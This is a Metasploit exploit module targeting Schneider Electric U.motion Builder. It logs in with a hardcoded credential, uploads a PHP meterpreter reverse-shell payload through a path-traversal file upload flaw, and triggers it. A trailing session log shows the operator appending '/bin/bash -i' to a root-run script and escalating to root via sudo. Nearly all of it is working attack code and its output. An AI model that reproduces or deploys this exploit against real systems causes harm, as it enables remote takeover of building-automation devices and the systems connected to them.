require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Schneider Electric U.motion Builder',
      'Description' => %q{
      },
      'Author' =>
        [
          'Mario Ceballos'
        ],
      'License' => 'BSD_LICENSE',
      'References' =>
        [
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-17-388/' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-17-372/' ],
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%\x00",
        },
      'DefaultOptions' =>
        {
	  'Payload'    => 'php/meterpreter/reverse_tcp'
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 12 2017'))

    register_options(
      [
       Opt::RPORT(8080), 
      ], self.class)
  end

  def exploit
    #ZDI-17-372
    print_status("Authenticating...")

    zdi_17_372 = "username=system&password=qpnvmu!!&rememberMe=1&context=runtime&op=login"

    login = send_request_cgi({
      'method' => 'POST',
      'uri' => "/umotion/modules/system/user_login.php",
      'data' =>  zdi_17_372
    })

    if login and login.headers['Set-Cookie']
	sessionid = login.headers['Set-Cookie'].split(';')[0]

	phpstuff = %Q|<?php #{payload.encoded} ?>|
	page = rand_text_alpha_upper(5) + ".php"

	dbl = Rex::MIME::Message.new
	dbl.add_part("../system/", nil, nil, "form-data; name=\"upload_path_to\"")
	dbl.add_part("1", nil, nil, "form-data; name=\"upload\"")
	dbl.add_part("0", nil, nil, "form-data; name=\"upload_local\"")
	dbl.add_part("0", nil, nil, "form-data; name=\"upload_local_file\"")
	dbl.add_part("0", nil, nil, "form-data; name=\"upload_local_path_from\"")
	dbl.add_part("0", nil, nil, "form-data; name=\"delete\"")
	dbl.add_part("", nil, nil, "form-data; name=\"delete_file_name\"")
	dbl.add_part(phpstuff, "application/octet-stream", nil, "form-data; name=\"upload_file\" ; filename=\"#{page}\"")
	data = dbl.to_s

	zdi_17_388 = send_request_cgi({
		'uri'   => "/umotion/modules/system/file_picker.php",
		'method' => 'POST',
		'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
		'cookie' => sessionid,
		'data' => data,
	})

		if zdi_17_388 and zdi_17_388.body =~ /#{page}/
		 print_status("Sending request to '/umotion/modules/system/#{page}'")
		 trigger = send_request_raw({'uri' => "/umotion/modules/system/#{page}"})
		 handler
		else
			print_error("Failed")
		end
	end
=begin
   def on_new_session(client)
     if client.type == "meterpreter"
       client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
       #client.process.execute("touch /tmp/mario_meterp.txt")
       res = client.process.getpid()
       puts res
     else
       #client.shell_write("whoami")
     end	
   end
=end
  end
end
__END__
# ZDI-17-392
meterpreter > shell
Process 2627 created.
Channel 0 created.
whoami
dpadweb
ls -lsa /home/dpadweb
total 14
1 drwxr-xr-x 5 dpadweb dlabusers 1024 Mar  6  2014 .
1 drwxr-xr-x 7 root    root      1024 Jan 21  2014 ..
1 -rw------- 1 dpadweb dlabusers   52 Dec 21  2010 .Xauthority
1 -rw------- 1 dpadweb dlabusers  119 Jan 22  2013 .bash_aliases
1 -rw------- 1 dpadweb dlabusers   10 Oct 23  2012 .bash_history
1 -rw-r--r-- 1 dpadweb dlabusers  220 Apr 13  2010 .bash_logout
4 -rw-r--r-- 1 dpadweb dlabusers 3213 Jan 21  2013 .bashrc
1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .cache
1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .config
1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .local
1 -rw-r--r-- 1 dpadweb dlabusers  675 Apr 13  2010 .profile
0 lrwxrwxrwx 1 root    root        30 Mar  6  2014 .reboot-script.sh -> /tmp/RWdlabs/.reboot-script.sh
0 lrwxrwxrwx 1 root    root        24 Jan 21  2014 .rscript.sh -> /tmp/RWdlabs/.rscript.sh
echo "/bin/bash -i" >> /tmp/RWdlabs/.rscript.sh
sudo /tmp/RWdlabs/.rscript.sh
bash: no job control in this shell

root@umotion:/mnt/storage/RWdlabs/smartdomuspad/modules/system# root@umotion:/mnt/storage/RWdlabs/smartdomuspad/modules/system# 
root@umotion:/mnt/storage/RWdlabs/smartdomuspad/modules/system# id
uid=0(root) gid=0(root) groups=0(root)
root@umotion:/mnt/storage/RWdlabs/smartdomuspad/modules/system# 
